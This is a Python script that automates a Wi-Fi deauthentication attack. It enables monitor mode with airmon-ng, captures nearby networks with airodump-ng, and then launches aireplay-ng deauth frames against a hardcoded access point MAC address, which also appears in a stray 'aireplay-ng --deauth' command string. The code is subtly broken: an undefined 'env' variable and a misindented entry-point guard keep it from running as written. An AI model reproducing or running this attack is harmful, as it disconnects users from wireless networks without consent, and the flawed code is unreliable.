import os
import random
import subprocess
import threading
import time
from subprocess import PIPE
from time import sleep

from AireplayThread import AireplayThread
from AirodumpThread import AirodumpThread

airmon_cmd_template = 'airmon-ng'


'sudo aireplay-ng --deauth 5 -a E0:28:6D:92:70:3B wlan0mon'


def startInterface(interface):
    airmon_cmd = list()
    airmon_cmd.append(airmon_cmd_template)
    airmon_cmd.append('start')
    airmon_cmd.append(interface)

    print(airmon_cmd)

    airmon_process = subprocess.Popen(airmon_cmd, stdout=PIPE, stderr=PIPE, env=env)

    try:
        outs, errs = airmon_process.communicate(timeout=15)
    except subprocess.TimeoutExpired:
        airmon_process.kill()
        outs, errs = airmon_process.communicate()

    err_str = errs.decode('utf-8')
    out_str = outs.decode('utf-8')

    print(out_str)

    interface_success = interface + 'mon'

    if interface_success in out_str:
        return True
    else:
        return False


def stopInterface(interface):
    interface = interface + 'mon'
    airmon_cmd = list()
    airmon_cmd.append(airmon_cmd_template)
    airmon_cmd.append('stop')
    airmon_cmd.append(interface)

    airmon_process = subprocess.Popen(airmon_cmd, stdout=PIPE, stderr=PIPE, env=env)

    try:
        outs, errs = airmon_process.communicate(timeout=15)
    except subprocess.TimeoutExpired:
        airmon_process.kill()
        outs, errs = airmon_process.communicate()

    err_str = errs.decode('ascii')
    out_str = outs.decode('ascii')

    print(out_str)

    interface_success = interface

    if interface_success in out_str:
        return True
    else:
        return False


def getRandomName():
    return ''.join(random.choice('0123456789ABCDEF') for i in range(16))

def main():
    interface = 'wlan0'
    print('Starting...')
    if startInterface(interface):
        # continue, because airmon was successful
        output_name = getRandomName()
        arg_list = list()
        arg_list.append('--write')
        arg_list.append('output-{}'.format(output_name))
        arg_list.append('--output-format')
        arg_list.append('csv')

        thread1 = AirodumpThread(1, interface, arg_list)
        thread1.setDaemon(True)
        thread1.start()

        startTime = time.time()
        while time.time() - startTime <= 60:
            print('Giving airodump time to capture...')
            sleep(1)

        print("Send stop to thread")
        thread1.stop()
        print("Asked thread to stop now.")
        sleep(1)

        if not thread1.is_alive():
            print("Successfully stopped thread with id {}".format(thread1.thread_id))

        thread2 = AireplayThread(2, interface, 'E0:28:6D:92:70:3B')
        thread2.setDaemon(True)
        thread2.start()

        startTime = time.time()
        while time.time() - startTime <= 20:
            print('Giving aireplay time to capture...')
            sleep(1)

    else:
        return -1

    if __name__ == '__main__':
        main()
